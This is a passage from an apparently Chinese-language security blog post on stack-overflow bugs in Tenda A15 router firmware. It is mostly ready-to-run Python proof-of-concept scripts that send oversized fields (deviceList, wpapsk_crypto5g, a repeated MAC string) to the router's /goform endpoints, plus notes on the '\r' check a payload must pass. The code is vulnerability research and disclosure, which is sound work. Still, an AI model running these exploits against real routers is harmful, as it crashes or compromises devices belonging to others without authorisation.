                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324163745390.png"
                      alt="image-20250324163745390"
                ><figcaption>image-20250324163745390</figcaption></figure></p>
<p>包含<code>\r</code>就返回1，所以我们的payload必须要有<code>\r</code>才能进到栈溢出的位置；</p>
<p>编写POC：</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ip = <span class="string">&#x27;192.168.0.6&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>/goform/SetBlackRule&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;deviceList&#x27;</span>: <span class="string">&#x27;a&#x27;</span> * <span class="number">0x200</span>+ <span class="string">&#x27;\r&#x27;</span> </span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = payload)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324164432035.png"
                      alt="image-20250324164432035"
                ><figcaption>image-20250324164432035</figcaption></figure></p>
<h2 id="fromSetWirelessRepeat函数"><a href="#fromSetWirelessRepeat函数" class="headerlink" title="fromSetWirelessRepeat函数"></a>fromSetWirelessRepeat函数</h2><p>参数：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324165028852.png"
                      alt="image-20250324165028852"
                ><figcaption>image-20250324165028852</figcaption></figure></p>
<p>溢出点：</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324164723596.png"
                      alt="image-20250324164723596"
                ><figcaption>image-20250324164723596</figcaption></figure></p>
<p>分析过程和上面一样，直接写POC了(注意里面的内容是前面的一些判断必须的)</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ip = <span class="string">&#x27;192.168.0.6&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>/goform/WifiExtraSet&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;configured5g&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;originSsid5g&#x27;</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;encode5g&#x27;</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;security5g&#x27;</span>: <span class="string">&#x27;wpapsk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wpapsk_type5g&#x27;</span>: <span class="string">&#x27;wpa2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wpapsk_crypto5g&#x27;</span>: <span class="string">&#x27;a&#x27;</span>* <span class="number">0x200</span>,</span><br><span class="line">    <span class="string">&#x27;wpapsk_key5g&#x27;</span>: <span class="string">&#x27;1234567890&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = payload)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure></div>

<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250324165313043.png"
                      alt="image-20250324165313043"
                ><figcaption>image-20250324165313043</figcaption></figure></p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ip = <span class="string">&#x27;192.168.0.6&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>/goform/SetOnlineDevName&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;mac&quot;</span>: <span class="string">&#x27;1e:ac:3e:99:9a:67&#x27;</span>*<span class="number">0x100</span>,</span><br><span class="line">    <span class="string">&quot;devName&quot;</span>: <span class="string">&#x27;devname1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = payload)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure></div>

<h2 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ip = <span class="string">&#x27;192.168.0.6&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>/goform/SetBlackRule&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;deviceList&#x27;</span>: <span class="string">&#x27;a&#x27;</span> * <span class="number">0x200</span>+ <span class="string">&#x27;\r&#x27;</span> </span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = payload)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure></div>

<h2 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">ip = <span class="string">&#x27;192.168.0.6&#x27;</span></span><br><span class="line">url = <span class="string">f&#x27;http://<span class="subst">&#123;ip&#125;</span>/goform/WifiExtraSet&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;configured5g&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;originSsid5g&#x27;</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;encode5g&#x27;</span>: <span class="string">&#x27;1234&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;security5g&#x27;</span>: <span class="string">&#x27;wpapsk&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wpapsk_type5g&#x27;</span>: <span class="string">&#x27;wpa2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;wpapsk_crypto5g&#x27;</span>: <span class="string">&#x27;a&#x27;</span>* <span class="number">0x200</span>,</span><br><span class="line">    <span class="string">&#x27;wpapsk_key5g&#x27;</span>: <span class="string">&#x27;1234567890&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url = url, data = payload)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>IOT</category>
        <category>CVE</category>
        <category>Tenda_A15</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>CVE</tag>
        <tag>Tenda_A15</tag>
      </tags>
  </entry>
</search>
